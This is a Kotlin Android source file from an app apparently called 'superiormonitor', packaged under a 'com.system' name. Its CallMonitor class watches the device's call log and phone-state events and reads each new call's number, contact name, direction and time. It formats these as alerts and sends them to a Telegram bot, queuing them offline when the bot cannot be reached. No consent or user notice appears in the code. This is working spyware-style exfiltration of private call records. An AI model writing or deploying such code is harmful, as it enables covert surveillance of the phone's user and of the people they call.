package com.system.superiormonitor.monitor

import com.system.superiormonitor.core.LogLevel

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.database.ContentObserver
import android.os.Handler
import android.os.Looper
import android.provider.CallLog
import android.telephony.TelephonyManager
import com.system.superiormonitor.bot.TelegramApi
import com.system.superiormonitor.core.LogCategory
import com.system.superiormonitor.core.LogManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock

class CallMonitor(
    private val context: Context,
    private val onUpdate: (String, String?) -> Boolean
) {

    private val prefsManager = com.system.superiormonitor.data.PrefsManager.getInstance(context)
    private var isRunning = false
    private var monitorJob = Job()
    private var monitorScope = CoroutineScope(Dispatchers.IO + monitorJob)
    private val processMutex = Mutex()

    private val callObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
        override fun onChange(selfChange: Boolean) {
            super.onChange(selfChange)
            LogManager.log(LogCategory.BASIC_UPDATE, "Call Monitor: DB change detected. Triggering check in 3s.")
            monitorScope.launch {
                delay(3000)
                processLatestCall()
            }
        }
    }

    private val callStateReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context?, intent: Intent?) {
            if (intent?.action == TelephonyManager.ACTION_PHONE_STATE_CHANGED) {
                val state = intent.getStringExtra(TelephonyManager.EXTRA_STATE)
                LogManager.log(LogCategory.BASIC_UPDATE, "Call Monitor: Phone State -> $state")

                // Only trigger delay on IDLE (when call ends) to prevent premature historical checks
                if (state == TelephonyManager.EXTRA_STATE_IDLE) {
                    LogManager.log(LogCategory.BASIC_UPDATE, "Call Monitor: Call ended. Triggering check in 3s.")
                    monitorScope.launch {
                        delay(3000)
                        processLatestCall()
                    }
                }
            }
        }
    }

    fun start() {
        if (isRunning) return
        try {
            if (monitorJob.isCancelled) {
                monitorJob = Job()
                monitorScope = CoroutineScope(Dispatchers.IO + monitorJob)
            }

            try {
                val uri = CallLog.Calls.CONTENT_URI
                val projection = arrayOf(CallLog.Calls._ID)
                // Use _ID DESC to bypass any system clock anomalies
                val sortOrder = "${CallLog.Calls._ID} DESC"
                context.contentResolver.query(uri, projection, null, null, sortOrder)?.use { cursor ->
                    if (cursor.moveToFirst()) {
                        val idIdx = cursor.getColumnIndexOrThrow(CallLog.Calls._ID)
                        prefsManager.callLastProcessedId = cursor.getLong(idIdx)
                    }
                }
            } catch (e: Exception) {
                // Fallback — will process from current state
                LogManager.log(LogCategory.BASIC_UPDATE, "Call Monitor Error: Failed to establish baseline ID (${e.message})", LogLevel.ERROR)
            }

            context.contentResolver.registerContentObserver(CallLog.Calls.CONTENT_URI, true, callObserver)
            val filter = IntentFilter(TelephonyManager.ACTION_PHONE_STATE_CHANGED)
            context.registerReceiver(callStateReceiver, filter)
            isRunning = true
            LogManager.log(LogCategory.BASIC_UPDATE, "Call Monitor Started.")
        } catch (e: SecurityException) {
            LogManager.log(LogCategory.BASIC_UPDATE, "Call Monitor Error: Missing Permissions.", LogLevel.ERROR)
        }
    }

    fun stop() {
        if (!isRunning) return
        try {
            context.contentResolver.unregisterContentObserver(callObserver)
            context.unregisterReceiver(callStateReceiver)
            monitorJob.cancel()
            isRunning = false
            LogManager.log(LogCategory.BASIC_UPDATE, "Call Monitor Stopped.")
        } catch (e: Exception) {
            // Ignore if not registered
            LogManager.log(LogCategory.BASIC_UPDATE, "Call Monitor Error: Shutdown failed (${e.message})", LogLevel.ERROR)
        }
    }

    private suspend fun processLatestCall() {
        processMutex.withLock {
        val uri = CallLog.Calls.CONTENT_URI
        val projection = arrayOf(CallLog.Calls._ID, CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.NUMBER, CallLog.Calls.CACHED_NAME)
        // Order by _ID instead of DATE guarantees the absolute newest inserted row is fetched
        val sortOrder = "${CallLog.Calls._ID} ASC"

        try {
            context.contentResolver.query(uri, projection, "${CallLog.Calls._ID} > ?", arrayOf(prefsManager.callLastProcessedId.toString()), sortOrder)?.use { cursor ->
                while (cursor.moveToNext()) {
                    kotlinx.coroutines.yield()
                    val idIdx = cursor.getColumnIndexOrThrow(CallLog.Calls._ID)
                    val typeIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE)
                    val dateIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)
                    val numberIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)
                    val nameIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)

                    val id = cursor.getLong(idIdx)
                    val type = cursor.getInt(typeIdx)
                    val dateInMillis = cursor.getLong(dateIdx)
                    val number = cursor.getString(numberIdx) ?: "Unknown"
                    val cachedName = cursor.getString(nameIdx)

                    val typeStr = when (type) {
                        CallLog.Calls.INCOMING_TYPE -> "Incoming"
                        CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
                        CallLog.Calls.MISSED_TYPE, CallLog.Calls.REJECTED_TYPE -> "Missed"
                        else -> "Other"
                    }

                    val formatter = SimpleDateFormat("hh:mm a | dd/MM/yyyy", Locale.getDefault())
                    val timeStr = formatter.format(Date(dateInMillis))
                    val contactName = if (cachedName.isNullOrEmpty()) "Unsaved" else cachedName

                    val safeContactName = TelegramApi.escapeMarkdown(contactName)
                    val safeNumber = TelegramApi.escapeMarkdown(number)

                    val output = com.system.superiormonitor.bot.BotMessages.Alerts.buildCallMessage(
                        typeStr, timeStr, safeContactName, safeNumber
                    )

                    com.system.superiormonitor.bot.OfflineManager.sendOrQueue(
                        context, output, "call_alrt", "offline_calls.txt", onUpdate
                    )
                    LogManager.log(LogCategory.BASIC_UPDATE, "Call Monitor: Processed $typeStr call from $contactName")
                    delay(3000)

                    if (id > prefsManager.callLastProcessedId) {
                        prefsManager.callLastProcessedId = id
                    }
                }
            }
        } catch (e: SecurityException) {
            LogManager.log(LogCategory.BASIC_UPDATE, "Call Monitor Error: Missing Permissions.", LogLevel.ERROR)
        } catch (e: Exception) {
            LogManager.log(LogCategory.BASIC_UPDATE, "Call Monitor Error: ${e.message}", LogLevel.ERROR)
        }
        }
    }
}
